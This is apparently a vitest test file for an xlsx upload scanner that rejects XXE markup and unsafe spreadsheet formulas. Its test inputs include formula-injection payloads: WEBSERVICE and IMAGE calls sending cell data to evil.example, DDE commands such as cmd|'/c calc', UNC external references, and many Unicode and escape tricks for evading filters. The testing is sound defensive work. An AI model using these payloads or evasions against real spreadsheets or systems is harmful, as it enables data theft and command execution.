import { readFileSync } from 'node:fs';
import { strToU8, unzipSync, type Unzipped } from 'fflate';
import { describe, expect, it } from 'vitest';

import {
  DEFAULT_COL_CAP,
  DEFAULT_MAX_BYTES,
  DEFAULT_ROW_CAP,
  MAX_FORMULA_TEXT_LENGTH,
  MAX_XMLNS_DECLARATIONS_PER_PART,
} from './constants';
import {
  assertSafeXmlContent,
  createEntryContentSniff,
  entryContentKind,
  feedEntryContentSniff,
  finishEntryContentSniff,
  isXmlPart,
  MAX_TRACKED_ELEMENT_DEPTH,
  type EntryContentKind,
  type ExternalHyperlinkIds,
} from './content-scan';
import { SpreadsheetFileError } from './errors';
import { SAFE_FORMULA_FUNCTIONS } from './formula-scan';
import { openUpload } from './guards';
import { UNSAFE_CONTENT_REASONS, ZIP_REJECT_REASONS } from './patch/reasons';
import { readUploadGrid } from './read-grid';
import { resolveReadOptions } from './read-options';
import { buildXlsxFixture, type XlsxFixtureSheet } from './testing/build-xlsx';
import { patchFixture } from './testing/patch-fixture';

const SPREADSHEET_NS = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const SHEET_PART = 'xl/worksheets/sheet1.xml';
const SECOND_SHEET_PART = 'xl/worksheets/sheet2.xml';
const WORKBOOK_RELS_PART = 'xl/_rels/workbook.xml.rels';
const SHARED_STRINGS_PART = 'xl/sharedStrings.xml';
const UTF8_DECLARATION = '<?xml version="1.0" encoding="UTF-8"?>';
const GUARD_OPTS = {
  rowCap: DEFAULT_ROW_CAP,
  colCap: DEFAULT_COL_CAP,
  maxBytes: DEFAULT_MAX_BYTES,
} as const;
// The S2 formula of trendyol-plus-tariff.xlsx exactly as stored, its quotes written as
// &quot; (the two non-ASCII letters escaped so this source stays ASCII).
const PLUS_S2_FORMULA =
  '=IF(OR(Q2=&quot;&quot;, R2=&quot;&quot;), &quot;-&quot;, IF(ISNUMBER(SEARCH(&quot;7 G\u00fcnl\u00fck&quot;, R2)), IF(Q2&lt;=M2, O2, &quot;-&quot;), &quot;-&quot;))';

// Real Trendyol exports committed under apps/api/tests/fixtures; a seller's normal
// file must never trip the content scan.
const API_FIXTURES: readonly string[] = [
  'trendyol-commission-tariff.xlsx',
  'trendyol-tariff-1period.xlsx',
  'trendyol-plus-tariff.xlsx',
  'trendyol-plus-tariff-3ve4.xlsx',
  'trendyol-discount-products.xlsx',
  'trendyol-flash-products.xlsx',
  'trendyol-advantage-tariff.xlsx',
  'marketplace-campaign-sample.xlsx',
];

function readFixture(file: string): Buffer {
  return readFileSync(new URL(`../../../apps/api/tests/fixtures/${file}`, import.meta.url));
}

// Non-ASCII text built from code points, so this source stays ASCII.
const LONG_S = String.fromCodePoint(0x17f); // LATIN SMALL LETTER LONG S
const BYTE_ORDER_MARK = String.fromCodePoint(0xfeff);
// A Turkish sheet name: capital U with diaeresis, r, small u with diaeresis, nler.
const URUNLER = `${String.fromCodePoint(0xdc)}r${String.fromCodePoint(0xfc)}nler`;
// A Turkish pivot field name with a space: capital U with diaeresis, r, small u with
// diaeresis, n, a space, Grubu.
const URUN_GRUBU = `${String.fromCodePoint(0xdc)}r${String.fromCodePoint(0xfc)}n Grubu`;
// From an ASCII capital letter to its full-width, its mathematical bold and its circled form.
const FULL_WIDTH_OFFSET = 0xff21 - 0x41;
const MATH_BOLD_OFFSET = 0x1d400 - 0x41;
const CIRCLED_OFFSET = 0x24b6 - 0x41;

/** `capitals` (ASCII capital letters) with each letter moved `offset` code points up. */
function shiftedCapitals(capitals: string, offset: number): string {
  return Array.from(capitals, (letter) => String.fromCodePoint(letter.charCodeAt(0) + offset)).join(
    '',
  );
}

function worksheetWithText(text: string, prolog = ''): string {
  return (
    `<?xml version="1.0" encoding="UTF-8"?>${prolog}<worksheet xmlns="${SPREADSHEET_NS}">` +
    `<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>${text}</t></is></c></row>` +
    `</sheetData></worksheet>`
  );
}

function entriesOf(parts: Readonly<Record<string, string>>): Unzipped {
  const out: Unzipped = {};
  for (const [path, text] of Object.entries(parts)) out[path] = strToU8(text);
  return out;
}

// Returns the SpreadsheetFileError the scan throws (given the external hyperlink ids
// `externalHyperlinks`, none by default), null when it passes, and re-throws anything
// unexpected.
function scanError(
  entries: Unzipped,
  externalHyperlinks: ExternalHyperlinkIds = new Map(),
): SpreadsheetFileError | null {
  try {
    assertSafeXmlContent(Object.entries(entries), externalHyperlinks);
    return null;
  } catch (e) {
    if (e instanceof SpreadsheetFileError) return e;
    throw e;
  }
}

// The SpreadsheetFileError `run` throws, null when it returns; anything else re-thrown.
function fileErrorOf(run: () => unknown): SpreadsheetFileError | null {
  try {
    run();
    return null;
  } catch (e) {
    if (e instanceof SpreadsheetFileError) return e;
    throw e;
  }
}

/**
 * The external hyperlink ids of worksheet `part`: `ids` it gives an external hyperlink
 * and nothing else, `amongOthers` one among other relationships.
 */
function hyperlinkIdsOf(
  part: string,
  ids: readonly string[],
  amongOthers: readonly string[] = [],
): ExternalHyperlinkIds {
  return new Map([
    [part, { onlyExternal: new Set(ids), external: new Set([...ids, ...amongOthers]) }],
  ]);
}

function gateError(file: Buffer): SpreadsheetFileError | null {
  return fileErrorOf(() => openUpload(file, GUARD_OPTS));
}

describe('assertSafeXmlContent', () => {
  it('rejects a DOCTYPE', () => {
    const upper = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('x', '<!DOCTYPE worksheet>') }),
    );
    expect(upper?.code).toBe('UNSAFE_CONTENT');
    expect(upper?.meta).toEqual({ entry: SHEET_PART });

    const lower = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('x', '<!doctype worksheet>') }),
    );
    expect(lower?.code).toBe('UNSAFE_CONTENT');
  });

  it('rejects an ENTITY declaration', () => {
    const err = scanError(
      entriesOf({
        [WORKBOOK_RELS_PART]: '<?xml version="1.0"?><!ENTITY lol "lol"><Relationships/>',
      }),
    );
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({ entry: WORKBOOK_RELS_PART });
  });

  it('rejects an unknown entity reference (&xxe;)', () => {
    const err = scanError(entriesOf({ [SHEET_PART]: worksheetWithText('&xxe;') }));
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({ entry: SHEET_PART });
  });

  it('accepts the five predefined and numeric references', () => {
    const err = scanError(
      entriesOf({ [SHEET_PART]: worksheetWithText('&amp;&lt;&gt;&quot;&apos;&#304;&#x130;') }),
    );
    expect(err).toBeNull();
  });

  it('accepts all eight api fixtures', () => {
    for (const file of API_FIXTURES) {
      expect(scanError(unzipSync(new Uint8Array(readFixture(file)))), file).toBeNull();
    }
  });
});

/** A worksheet whose one cell holds `cellContent`; the root also binds the `x` prefix. */
function worksheetWithCell(cellContent: string): string {
  return (
    `<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="${SPREADSHEET_NS}" xmlns:x="${SPREADSHEET_NS}">` +
    `<sheetData><row r="1"><c r="A1">${cellContent}</c></row></sheetData></worksheet>`
  );
}

/** A worksheet whose one cell holds the formula element `formula` and a cached value. */
function worksheetWithFormula(formula: string): string {
  return worksheetWithCell(`${formula}<v>0</v>`);
}

/** `text` written into XML character data: '&', '<' and '>' as references. */
function xmlText(text: string): string {
  return text.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
}

/** The scan's error for a worksheet whose one formula is the decoded formula text `text`. */
function formulaError(text: string): SpreadsheetFileError | null {
  return scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(`<f>${xmlText(text)}</f>`) }));
}

function expectUnsafeFormula(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('UNSAFE_CONTENT');
  expect(error?.meta).toEqual({ reason: UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA, entry });
}

function expectUnsafePart(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('UNSAFE_CONTENT');
  expect(error?.meta).toEqual({ reason: UNSAFE_CONTENT_REASONS.UNSAFE_PART, entry });
}

describe('assertSafeXmlContent: formula fields', () => {
  it.each([
    '<f>WEBSERVICE("http://x")</f>',
    '<f>webservice ("x")</f>',
    '<f>HYPERLINK("http://x","y")</f>',
    '<f>IMPORTXML(A1)</f>',
    '<f>CALL("k","f")</f>',
    '<f>REGISTER.ID("k","f")</f>',
    "<f>cmd|'/c calc'!A1</f>",
    '<f>[1]Sheet1!A1</f>',
    '<x:f>EXEC("a")</x:f>',
  ])('refuses %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  it.each([
    '<f>_xlfn.WEBSERVICE("x")</f>',
    '<f>_XLFN._xlws.WEBSERVICE("x")</f>',
    '<f>&#87;EBSERVICE("x")</f>',
    '<f>&#x57;EBSERVICE("x")</f>',
    '<f>&#0000087;EBSERVICE("x")</f>',
    '<f>WEB<!--x-->SERVICE("x")</f>',
    '<f><![CDATA[WEBSERVICE("x")]]></f>',
    '<f>WEBSERVICE<?x?>("x")</f>',
    '<f>IF(A1=&quot;a&quot;,WEBSERVICE(B1),1)</f>',
    '<f>A1&#124;B1</f>',
    '<f>A1<g/></f>',
    '<f>WEB&#xAD;SERVICE(1)</f>',
    '<f>WEBSERVICE&#40;"x")</f>',
    '<f>_xlfn&#46;WEBSERVICE("x")</f>',
    '<f>&#91;1]S!A1</f>',
    '<f>WEBSERVICE&#xA0;("x")</f>',
    '<f>WEBSERVICE&#9;("x")</f>',
    '<f>WEBSERVICE&#10;("x")</f>',
    '<f t="shared" ref="A1:A3" si="0">WEBSERVICE("x")</f>',
    '<f t="array" ref="A1:A3">WEBSERVICE("x")</f>',
    '<f>WEBSERVICE("x")</f >',
  ])('refuses the evasion %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  // A function passed by name (an eta lambda) needs a function outside the list to call
  // it; an internal prefix refuses wherever it stands.
  it.each([
    '_xlfn.MAP("http://evil.example/",_xleta.WEBSERVICE)',
    '_xlfn.LET(_xlpm.w,_xleta.WEBSERVICE,_xlpm.w("http://evil.example"))',
    '_xlfn.BYROW(A1:A2,_xlfn.WEBSERVICE)',
    '_xlfn.LET(_xlpm.w,_xleta.IMPORTXML,_xlpm.w(A1))',
    '_xlfn.MAP(A1,_xleta.IMPORTRANGE)',
    '_XLETA._xlpm.WEBSERVICE',
    '_XlEtA._xlfn.ImportXml',
    '_XlFn._xLwS._XLL._xlfn.webService("x")',
  ])('refuses a function passed by name or behind an internal prefix: %s', (text) => {
    expectUnsafeFormula(formulaError(text));
  });

  // A quoted sheet name may hold '"' and '|'; the scan reads it whole, so neither a quote
  // inside it nor one after it hides a name.
  it.each([
    "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://evil.example/?d=&quot;&amp;A2)</f>",
    "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://x&quot;)&amp;'a&quot;b'!A1</f>",
    '<f>\'x\'!A1&amp;WEBSERVICE("u")</f>',
    "<f>'It''s'!A1&amp;WEBSERVICE(\"u\")</f>",
    "<f>'abc!A1</f>",
    "<f>'It''s!A1</f>",
    "<f>'a''</f>",
    "<f>'a''b'!A1|B1</f>",
    '<f>IF(A1="abc,1,2)</f>',
    '<f>IF(A1="say ""x"",1,2)</f>',
    '<f>&quot;abc</f>',
    '<f>"a""b"&amp;WEBSERVICE("x")</f>',
  ])('refuses a sheet name or literal it cannot close, or a name after one: %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  // A name a reader that normalises (NFKC) or upper-cases with Unicode rules reads as a
  // function outside the list: U+017F LATIN SMALL LETTER LONG S, U+0131 LATIN SMALL LETTER
  // DOTLESS I, full-width letters, mathematical bold letters.
  it.each([
    '<f>WEB&#383;ERVICE("x")</f>',
    `<f>WEB${LONG_S}ERVICE("x")</f>`,
    '<f>&#305;MPORTXML("x","//a")</f>',
    `<f>${shiftedCapitals('WEBSERVICE', FULL_WIDTH_OFFSET)}("x")</f>`,
    `<f>${shiftedCapitals('WEBSERVICE', MATH_BOLD_OFFSET)}("x")</f>`,
  ])('refuses the Unicode variant %s', (formula) => {
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) })));
  });

  it.each([
    `<f>${PLUS_S2_FORMULA}</f>`,
    '<f>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</f>',
    '<f>IF(A1=&quot;WEBSERVICE(&quot;,1,2)</f>',
    '<f>IF(A1&lt;=B1,1,2)</f>',
    '<f>IF(ISNUMBER(SEARCH("a",B2)),"WEBSERVICE(",1)</f>',
    '<f>IF(A1="say ""WEBSERVICE(""",1,2)</f>',
    '<f>IMAGES1+RTD2</f>',
    '<f t="shared" si="0"/>',
    "<f>'a|b'!A1</f>",
    "<f>'It''s'!A1</f>",
    '<f>&apos;It&apos;&apos;s&apos;!A1</f>',
    "<f>'a&quot;b'!A1+1</f>",
    '<f>IF(A1="it\'s",1,2)</f>',
    "<f>SUM('x'!A1,'y'!B2)</f>",
    `<f>'${URUNLER}'!A1</f>`,
    `<f>${URUNLER}!A1</f>`,
    `<f>${URUNLER.normalize('NFD')}!A1</f>`,
    '<f>CALL</f>',
  ])('accepts %s', (formula) => {
    expect(scanError(entriesOf({ [SHEET_PART]: worksheetWithFormula(formula) }))).toBeNull();
  });

  it('accepts the text WEBSERVICE( in a cell value outside any formula', () => {
    const xml = worksheetWithCell('<is><t>WEBSERVICE("x")</t></is>').replace(
      '<c r="A1">',
      '<c r="A1" t="inlineStr">',
    );

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  // A cell may hold text that starts with '=', '+', '-' or '@': xlsx stores it as a
  // string, which Excel shows and never evaluates.
  it('accepts formula-looking string values', () => {
    const xml =
      `${UTF8_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}"><sheetData><row r="1">` +
      '<c r="A1" t="inlineStr"><is><t>=WEBSERVICE("http://evil.example/?"&amp;B1)</t></is></c>' +
      `<c r="B1" t="str"><v>=cmd|'/c calc'!A0</v></c>` +
      `<c r="C1" t="inlineStr"><is><t>@SUM(1+1)*cmd|' /C calc'!A0</t></is></c>` +
      '</row></sheetData></worksheet>';

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('refuses a formula element that never closes', () => {
    const whole = worksheetWithFormula('<f>1+1</f>');
    const truncated = whole.slice(0, whole.indexOf('</f>'));

    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: truncated })));
  });

  it('refuses a formula element closed by the end tag of another element', () => {
    expectUnsafeFormula(
      scanError(entriesOf({ [SHEET_PART]: worksheetWithCell('<f>1+1</v><v>2</v>') })),
    );
  });

  // The strict lexer refuses markup xmldom reads; past it the walk cannot tell where the
  // fields are, so any start tag another reader could take for a field element, and any
  // name of a field or macro attribute, refuses.
  it('refuses a formula after markup the strict lexer cannot read', () => {
    const noSpaceBetweenAttributes = worksheetWithFormula('<f>WEBSERVICE("x")</f>').replace(
      '<c r="A1">',
      '<c r="A1"t="n">',
    );
    const nonAsciiPrefix = worksheetWithFormula(
      '<\u00fc:f xmlns:\u00fc="urn:x">WEBSERVICE("x")</\u00fc:f>',
    );

    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: noSpaceBetweenAttributes })));
    expectUnsafeFormula(scanError(entriesOf({ [SHEET_PART]: nonAsciiPrefix })));
  });

  it.each([
    [
      'a later defined name',
      '<definedName name="x">1</definedName>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    ['a later macro attribute', '<sp macro="[0]!m"/>', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA],
    [
      'a later textlink attribute in another case',
      '<sp TextLink="$A$1"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    ['a later oleObject', '<oleObject progId="Package"/>', UNSAFE_CONTENT_REASONS.UNSAFE_PART],
    [
      'a later conditional format value object',
      '<cfvo type="num" val="1"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    [
      'a later hyperlink',
      '<x:hyperlink ref="A1" location="A1"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    [
      'a later camera tool in another case',
      '<CameraTool cellRange="A1"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
    ],
    ['a later script', '<x:ScriptText/>', UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA],
    [
      'a later src attribute, even a relative one',
      '<z src="x.png"/>',
      UNSAFE_CONTENT_REASONS.UNSAFE_PART,
    ],
  ])('refuses %s after markup the strict lexer cannot read', (_label, later, reason) => {
    const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', `<c r="A1"t="n">${later}`);

    const error = scanError(entriesOf({ [SHEET_PART]: xml }));

    expect(error?.code).toBe('UNSAFE_CONTENT');
    expect(error?.meta).toEqual({ reason, entry: SHEET_PART });
  });

  it('accepts markup the strict lexer cannot read when no field follows it', () => {
    const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', '<c r="A1"t="n">');

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('accepts Windows paths with parentheses after markup the strict lexer cannot read', () => {
    const xml = worksheetWithCell('<v>1</v>').replace(
      '<c r="A1">',
      '<c r="A1"t="n"><z descr="C:\\x\\Trendyol(1).png" title="C:\\Users\\u\\Desktop\\Yeni klasor (2)\\"/>',
    );

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('refuses an unsafe formula in a workbook at the upload gate', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula('<f>_xlfn.WEBSERVICE("http://x")</f>') },
    ]);

    expectUnsafeFormula(gateError(file));
  });
});

// Probe inputs of the review rounds, as decoded formula text: each reaches outside the
// workbook, or could in a reader that decodes, normalises or splits names differently.
describe('assertSafeXmlContent: the formula allow list', () => {
  it.each([
    ['circled letters', `${shiftedCapitals('WEBSERVICE', CIRCLED_OFFSET)}("http://evil.example/")`],
    ['one circled letter', `W${shiftedCapitals('E', CIRCLED_OFFSET)}BSERVICE("x")`],
    ['a circled last letter', `WEBSERVIC${shiftedCapitals('E', CIRCLED_OFFSET)}("x")`],
    ['a full-width low line prefix', '\uff3fxlfn.WEBSERVICE("http://evil.example/")'],
    ['full-width quotes around a call', '"\uff02&WEBSERVICE("http://evil.example/")&\uff02"'],
    ['a full-width DDE bar', "cmd\uff5c'/c calc'!A0"],
    ['a full-width bracket', '\uff3b1]Sheet1!A1'],
    ['a full-width parenthesis', 'WEBSERVICE\uff08"x")'],
    ['a soft hyphen', 'WEB\u00adSERVICE("x")'],
    ['a zero-width joiner', 'WEB\u200dSERVICE("x")'],
    ['a zero-width space', 'WEB\u200bSERVICE("x")'],
    ['a word joiner', 'WEB\u2060SERVICE("x")'],
    ['a right-to-left mark', 'WEB\u200fSERVICE("x")'],
    ['a byte order mark', 'WEB\ufeffSERVICE("x")'],
    ['a format character at the end', 'SUM(A1)\u200b'],
    ['a format character in a quoted sheet name', "'a\u200bb'!A1"],
    ['a format character in a structured reference', 'T[a\u200bb]'],
    ['a combining grapheme joiner', 'WEB\u034fSERVICE("x")'],
    ['a variation selector', 'WEB\ufe0fSERVICE("x")'],
    ['a combining accent on the first letter', 'W\u0301EBSERVICE("x")'],
    ['a combining accent after the name', 'WEBSERVICE\u0301("x")'],
    ['a dotted capital I', 'WEBSERV\u0130CE("x")'],
    ['a Roman numeral one', 'WEBSERV\u2160CE("x")'],
    ['a ligature', 'WEBSERVI\ufb00("x")'],
    ['a line break inside the name', 'WEB\nSERVICE("x")'],
    ['an at sign', '@WEBSERVICE("x")'],
    ['a name behind KELVIN SIGN', '\u212aWEBSERVICE("x")'],
    ['the _xludf. prefix', '_xludf.WEBSERVICE("http://evil.example/")'],
    ['the _xludf. prefix on an allowed name', '_xludf.SUM(1)'],
    ['the _xlop. prefix after _xlfn.', '_xlfn._xlop.WEBSERVICE("x")'],
    ['the _xlnm. prefix', '_xlnm.WEBSERVICE(1)'],
    ['a defined name behind _xlnm.', '_xlnm.Print_Area'],
    ['the _xlpm. prefix', '_xlpm.x'],
    ['a vendor-qualified name', '_xlfn.COM.MICROSOFT.WEBSERVICE("x")'],
    ['a vendor-qualified name without prefix', 'COM.MICROSOFT.WEBSERVICE("x")'],
    ['an OpenOffice DDE', 'ORG.OPENOFFICE.DDE("cmd";"/c calc";"A1")'],
    ['DDE', 'DDE("cmd","/c calc","A1")'],
    ['LAMBDA', '_xlfn.LAMBDA(_xlpm.x,WEBSERVICE(_xlpm.x))("x")'],
    ['a LAMBDA parameter named like a function', '_xlfn.LAMBDA(_xlpm.image,_xlpm.image*2)(1)'],
    ['PY', '_xlfn._xlws.PY("import os",0)'],
    ['COPILOT', '_xlfn.COPILOT("send",A1:A9)'],
    ['STOCKHISTORY', '_xlfn.STOCKHISTORY("MSFT",TODAY())'],
    ['TRANSLATE', '_xlfn.TRANSLATE(A1,"tr","en")'],
    ['DETECTLANGUAGE', '_xlfn.DETECTLANGUAGE(A1)'],
    ['FILTERXML', '_xlfn.FILTERXML("<a/>","//a")'],
    ['ENCODEURL', '_xlfn.ENCODEURL(A1)'],
    ['IMAGE', '_xlfn.IMAGE("http://evil.example/?"&A1)'],
    ['RTD', 'RTD("prog.id","evil-host","t")'],
    ['SQL.REQUEST', 'SQL.REQUEST("DSN=x",,1,"select 1")'],
    ['INFO', 'INFO("directory")'],
    ['CELL', 'CELL("filename")'],
    ['INDIRECT to another workbook', 'INDIRECT("[evil.xlsx]S!A1")'],
    ['INDIRECT to a DDE link', 'INDIRECT("cmd|\'/c calc\'!A0")'],
    ['EVALUATE', 'EVALUATE("1")'],
    ['CUBEVALUE', 'CUBEVALUE("conn","x")'],
    ['IMPORTDATA', 'IMPORTDATA("http://evil.example/")'],
    ['HYPERLINK to a web page', 'HYPERLINK("https://www.trendyol.com/x","link")'],
    ['a name ending in a listed one', 'RECALL(A1)'],
    ['a call after white space', 'WEBSERVICE \r\n ("x")'],
    ['a number called', '5(A1)'],
    ['an _xHHHH_ escape of the first letter', '_x0057_EBSERVICE("http://evil.example/?"&A2)'],
    [
      'escapes of every letter',
      '_x0057__x0045__x0042__x0053__x0045__x0052__x0056__x0049__x0043__x0045_("x")',
    ],
    ['an escape inside the name', 'WEB_x0053_ERVICE("x")'],
    ['an escaped DDE bar', "cmd_x007C_'/c calc'!A0"],
    ['escaped brackets', '_x005B_1_x005D_Sheet1!A1'],
    ['an escaped quote', '"_x0022_&WEBSERVICE("http://evil.example/")&_x0022_"'],
    ['an escape after a prefix', '_xlfn._x0049_MAGE("http://evil.example/p.png")'],
    ['an escape in lower-case hexadecimal', 'SUM(1)&_x00ab_'],
    ['an escape inside a string literal', 'IF(A1="_X0041_",1,2)'],
    ['a full-width escape', 'SUM(1)&\uff3f\uff58\uff10\uff10\uff14\uff11\uff3f'],
    ['a DDE link', "cmd|'/c calc'!A0"],
    ['a reference into another workbook', '[1]Sheet1!A1'],
    ['a bracket that closes nothing', 'A1]'],
    ['a structured reference that never closes', 'Table1[Fiyat'],
    ['an escape at the end of a structured reference', "Table1['"],
    ['an external workbook in a quoted sheet name', "'[1]My Sheet'!A1"],
    [
      'a network path workbook in a quoted sheet name',
      "'\\\\evil.example\\share\\[x.xlsx]Sheet1'!A1",
    ],
    ['a web workbook in a quoted sheet name', "'http://evil.example/[x.xlsx]Sheet1'!A1"],
    ['a drive path workbook in a quoted sheet name', "'C:\\Users\\Public\\[x.xlsx]S'!A1"],
    ['a network path name without a bracket', "'\\\\evil.example\\share\\x.xlsx'!Secret"],
    ['a web name without a bracket', "'http://evil.example/x.xlsx'!Secret"],
    ['a question mark in a quoted sheet name', "'a?b'!A1"],
    ['an asterisk in a quoted sheet name', "'a*b'!A1"],
    ['a sum over a quoted external range', "SUM('\\\\evil.example\\s\\[a.xlsx]S'!A1:A9)"],
    ['a slash in the quoted sheet name of a cell formula', "'Fiyat/Adet' *Adet"],
    ['a network path workbook without quotes', '\\\\evil.example\\share\\[x.xlsx]S!A1'],
    ['a drive path workbook without quotes', 'C:\\temp\\[Book1.xlsx]Sheet1!$A$1'],
    ['a network path name without quotes', '\\\\evil.example\\share\\Book2.xlsx!MyName'],
    ['a drive path name without quotes', 'C:\\temp\\Book2.xlsx!MyName'],
    ['a backslash alone', 'A1\\B1'],
    ['a bracket after a number', 'SUM(1[1]Sheet1!A1)'],
    ['a bracket after a period', 'SUM(.[1]Sheet1!A1)'],
    ['a bracket after a backslash', 'SUM(\\[1]Sheet1!A1)'],
    ['a bracket after a combining mark', '\u0301[1]Sheet1!A1'],
    ['a name of another workbook', '[1]!x'],
    ['this workbook before a reference', '[0]!$A$1'],
    ['this workbook before a sheet', '[0]Sheet1!A1'],
    ['this workbook before nothing', '[0]!'],
    ['this workbook before a number', '[0]!1'],
    ['this workbook before a call outside the list', '[0]!WEBSERVICE("x")'],
    ['a call of a parenthesised name', '(WEBSERVICE)("http://evil.example/")'],
    ['a call of a CHOOSE result', 'CHOOSE(1,WEBSERVICE)("http://evil.example/?"&A1)'],
    ['a call of an IF result', 'IF(TRUE,HYPERLINK)("http://evil.example/","x")'],
    ['a call of an INDEX result', 'INDEX(A1:A2,1)("x")'],
    ['a call of a structured reference', 'Table1[Col]("x")'],
    ['a call of an array constant', '{1,2}("x")'],
    ['a chart data name called', '_xlchart.v1.0("x")'],
    ['a chart data name called after white space', '_xlchart.v1.0 ("x")'],
    ['a chart data name behind _xlfn.', '_xlfn._xlchart.v1.0'],
    ['two backslashes', '\\\\'],
    ['a backslash before a digit', 'SUM(\\1)'],
    ['a backslash after a colon', 'A1:\\B1'],
    ['a backslash after a backslash name', '\\a\\b'],
    ['a backslash name calling WEBSERVICE', '\\WEBSERVICE("http://evil.example/")'],
    ['a sheet right after a structured reference', 'Table1[x]Sheet1!A1'],
    ['a sheet right after a bracketed number', 'x[1]Sheet1!A1'],
    ['a digit right after a structured reference', 'Table1[x]1'],
    ['a backslash name right after a structured reference', 'Table1[x]\\Name'],
    ['an item selector after a quoted sheet name', `'${URUN_GRUBU}'[Elektronik]*1.1`],
  ])('refuses %s', (_label, text) => {
    expectUnsafeFormula(formulaError(text));
  });

  it.each([
    ['a sheet named Imports', 'Imports!A1'],
    ['a defined name that starts with Import', 'ImportFee*2'],
    ['a whole column RTD', 'RTD:RTD'],
    ['a sum over a whole column RTD', 'SUM(RTD:RTD)'],
    ['an absolute reference to column RTD', 'SUM($RTD$1)'],
    ['a bare CALL', 'CALL'],
    ['a sheet named Image', 'SUM(Image!B:B)'],
    ['a sheet named Exec', 'Exec!A1'],
    ['a sheet named Call', 'Call!A1'],
    ['a Turkish sheet name', `${URUNLER}!A1`],
    ['a quoted Turkish sheet name', `'${URUNLER}'!A1`],
    ['a sheet name with a dotted capital I', '\u0130THALAT!A1'],
    ['a doubled apostrophe in a sheet name', "'It''s'!A1"],
    ['a bar in a quoted sheet name', "'a|b'!A1"],
    ['a 3-D reference', "'Jan:Mar'!A1"],
    ['an apostrophe in a string literal', 'IF(A1="it\'s",1,2)'],
    ['a format character in a string literal', 'IF(A1="a\u200bb",1,2)'],
    ['a rounded product', 'ROUND(A1*0.9,2)'],
    ['a lookup', 'VLOOKUP(A1,B:C,2,FALSE)'],
    ['a structured reference', 'SUM(Table1[Fiyat])'],
    ['a this-row structured reference', 'Table1[[#This Row],[Fiyat]]*2'],
    ['an escaped bracket in a structured reference', "Table1['[Fiyat]*2"],
    ['XLOOKUP over structured references', 'XLOOKUP(A1,Urunler[Barkod],Urunler[Fiyat])'],
    ['XLOOKUP behind _xlfn.', '_xlfn.XLOOKUP(A1,Urunler[Barkod],Urunler[Fiyat])'],
    ['SORT behind _xlfn._xlws.', '_xlfn._xlws.SORT(A1:A9)'],
    ['the 3ve4 data validation formula', 'OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))'],
    ['a call after white space', 'SUM (A1:A2)'],
    ['error values', 'IFERROR(#N/A,#REF!)'],
    ['an array constant', 'SUM({1,2;3,4})'],
    ['a spill reference', 'SUM(_xlfn.ANCHORARRAY(D2))'],
    ['an implicit intersection', '_xlfn.SINGLE(A1:A10)'],
    ['a table name', 'Table1[Fiyat]'],
    ['a table name that starts with a low line', '_tbl[Col]'],
    ['a Turkish table name', `${URUNLER}[Fiyat]`],
    ['a defined name of this workbook', '[0]!SalesRange'],
    ['a sum over a defined name of this workbook', 'SUM([0]!_Satis)'],
    ['an intersection of two parenthesised ranges', 'SUM((A1:B2) (B1:C2))'],
    ['a backslash in a string literal', 'IF(A1="C:\\temp",1,2)'],
    ['a chart data name', '_xlchart.v1.0'],
    ['an intersection of two chart data names', '_xlchart.v1.0 _xlchart.v5.12'],
    ['a sum over a defined name that starts with a backslash', 'SUM(\\Fiyatlar)'],
    ['a shortcut macro name', '\\a'],
    ['a sheet-level name that starts with a backslash', 'Sheet1!\\a'],
    ['a table name that starts with a backslash', '\\Fiyatlar[Fiyat]*2'],
    ['a backslash name after an operator', 'A1*\\_Oran'],
    ['a structured reference times two', 'Table1[Fiyat]*2'],
    ['a structured reference before white space', 'Table1[Fiyat] Table1[Adet]'],
  ])('accepts %s', (_label, text) => {
    expect(formulaError(text)).toBeNull();
  });

  it('pins the allow list: sorted upper-case ASCII names, no function that reaches outside', () => {
    expect(SAFE_FORMULA_FUNCTIONS).toEqual([...SAFE_FORMULA_FUNCTIONS].sort());
    for (const name of SAFE_FORMULA_FUNCTIONS) expect(name).toMatch(/^[A-Z][A-Z0-9.]*$/);
    // Every function the eight real files call, in any formula field.
